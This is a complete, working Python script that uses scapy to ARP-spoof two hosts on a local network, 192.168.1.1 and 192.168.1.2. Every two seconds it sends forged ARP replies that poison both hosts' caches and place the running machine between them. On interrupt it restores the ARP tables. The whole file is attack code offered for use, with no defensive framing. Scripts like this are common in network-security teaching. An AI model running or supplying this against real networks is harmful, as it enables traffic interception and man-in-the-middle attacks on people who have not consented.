#!/usr/bin/python3
import scapy.all as scapy
from time import sleep

def getMAC(ip):
    "get the MAC address of a given IP"
    ARPPacket = scapy.ARP(pdst=ip);
    etherPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    etherARP = etherPacket/ARPPacket
    answer = scapy.srp(etherARP, verbose=False, timeout=1)[0]
    return answer[0][1].hwdst

def sendARPResponse(targetIP, sourceIP):
    "send an ARP response, fooling the target"
    targetMAC = getMAC(targetIP)
    ARPPacket = scapy.ARP(pdst=targetIP, psrc=sourceIP, hwdst=targetMAC, op=2, )
    scapy.send(ARPPacket, verbose=False)

def restoreARPTable(sourceIP, destinationIP):
    "restore ARP table back to normal"
    sourceMAC = getMAC(sourceIP)
    destinationMAC = getMAC(destinationIP)
    ARPPacket = scapy.ARP(pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC, op=2)
    scapy.send(ARPPacket, verbose=False)

packetsSent = 0

while True:
    try:
        sendARPResponse('192.168.1.2', '192.168.1.1')
        sendARPResponse('192.168.1.1', '192.168.1.2')
        packetsSent += 2
        print(f'\r[+] {packetsSent} packets sent', end="")
        sleep(2)
    except KeyboardInterrupt:
        print("[+] detected keyboard interrupt, restoring arp tables..")
        restoreARPTable('192.168.1.1', '192.168.1.2')
        restoreARPTable('192.168.1.2', '192.168.1.1')
        print('[+] everything back to normal, quitting..')
        exit(0)
